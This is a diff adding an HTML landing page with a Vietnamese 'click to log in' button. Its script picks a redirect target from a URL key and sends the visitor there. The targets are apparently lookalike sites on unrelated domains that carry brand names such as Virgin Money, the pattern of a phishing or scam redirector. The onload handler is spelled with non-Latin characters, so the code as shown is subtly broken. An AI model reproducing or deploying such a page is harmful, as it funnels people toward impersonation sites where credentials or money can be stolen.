@@ -1,0 +1,104 @@
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="wap-font-scale" content="no">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Microsoft YaHei';
+        }
+
+        .weui-btn_primary {
+            background-color: #f09972
+        }
+
+        .weui-btn {
+            position: relative;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            padding-left: 14px;
+            padding-right: 14px;
+            box-sizing: border-box;
+            font-size: 18px;
+            text-align: center;
+            text-decoration: none;
+            color: #FFF;
+            line-height: 2.55555556;
+            border-radius: 5px;
+            -webkit-tap-highlight-color: transparent;
+            overflow: hidden;
+            margin-bottom: 20px
+        }
+
+
+        .icon {
+            font-size: 93px;
+            margin: 20px auto
+        }
+
+        .actions {
+            padding: 10px 30px
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="actions" id="goHome" style="margin-top:300px">
+        <a href="#" class="weui-btn weui-btn_primary" id="gogo">Bấm vào để đăng nhập</a>
+    </div>
+    <script>
+        var linkObj = {
+          	  "c33f030e6ad711edbd5d02c1e46d1b62": "https://virginmoney-h5.b3ynxd.com/VIRGINMONEY-h5/index.html",
+		  "d0f48df16ad711edbd5d02c1e46d1b63": "https://virginmoney.b3ynxd.com/VIRGINMONEY/jump.html",
+		  "f3ee9f737c4811eda25402c1e46d1b68": "https://doctor-h5.b3ynxd.com/DOCTOR-h5/index.html",
+		  "fd379d3c7c4811eda25402c1e46d1b68": "https://doctor.b3ynxd.com/DOCTOR/jump.html",
+		  "a13ce28bcd4111ec81ba0afdb9edd2a3": "https://corptg-h5.x4y5.de/corptg-h5/index.html",
+		  "c8838e2ecd4211ec82ca0afdb9edd2a4": "https://corptg.x4y5.de/corptg/jump.html",
+		  "6959332b800a11edac1502c1e46d1b68": "https://portal.btrademarket.com"
+        };
+		
+        var params = getParams()
+        var link = document.querySelector('#gogo')
+        //link.addEventListener('click', function () {
+            // var address = window.location.origin + '/download/index.html'
+            //var address = linkObj[params.key]
+            //window.location.href = address;
+        //})
+		
+		window.οnlοad = function () {
+            // var address = window.location.origin + '/download/index.html'
+            var address = linkObj[params.key]
+            window.location.href = address;
+        }
+		
+        function getParams () {
+            var url = window.location.href;
+            var obj = {};
+            var arr = url.slice(url.indexOf('?')+1).split('&');
+            arr.forEach(function (item) {
+                var param = item.split('=');
+                obj[param[0]] = param[1];
+            })
+            return obj;
+        }
+    </script>
+
+
+    <div class="yformater-layer">
+        <div class="yformater-layer-content"><i class="yformater-layer-icon"></i></div>
+    </div>
+
+
+</body>
+
+</html>
